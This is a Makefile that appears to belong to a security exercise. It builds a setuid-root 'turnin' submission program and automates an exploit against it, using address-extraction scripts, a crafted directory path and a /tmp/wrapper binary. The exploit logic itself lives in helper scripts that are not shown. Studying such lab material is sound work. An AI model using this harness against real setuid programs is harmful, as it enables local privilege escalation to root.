VERBOSE=1
#NOSETUID=1
UID=$(if $(NOSETUID),$(shell id -u),0)

turnin=$(PWD)/turnin

DEFINES=\
	$(if $(NOSETUID),-DNOSETUID)\
	$(if $(VERBOSE),-DVERBOSE)\
	$(if $(DUMPMEM),-DDUMPMEM)\
	$(if $(UID),-DUID=$(UID))

default: exploit

sync:
	rsync -rluv $(VMHOST):projects/turnin ~/

wrapper: wrapper.c
	gcc -o $@ $^ $(DEFINES)

/tmp/wrapper: wrapper
	cp -f $< $@

turnin: $(turnin)

$(PWD)/turnin: turnin.c
	gcc -g -o $@ $< $(DEFINES)
	if test -z "$(NOSETUID)"; \
  then \
    sudo chown root:users $@; \
    sudo chmod u=rwsx,go=rx $@; \
  fi

exploit.addrs: $(turnin)
	./get_addrs.pl $^ > $@

exploit.dir: exploit.addrs
	./exploit_dir.pl $^ > $@

exploit: exploit.dir /tmp/wrapper
	mkdir -p "`cat $<`/foo"
	touch "`cat $<`/foo/bar"
	mkdir -p $(HOME)/TURNIN/tmp/wrapper
	cd "`cat $<`" && $(turnin) /tmp/wrapper@$(USER) foo

cleanup:
	rm -rf $(HOME)/TURNIN/* /tmp/wrapper /tmp/XXX*

clean: cleanup
	rm -f wrapper exploit.*

cleanall: clean
	rm -f turnin

.PHONY: turnin exploit cleanup clean cleanall

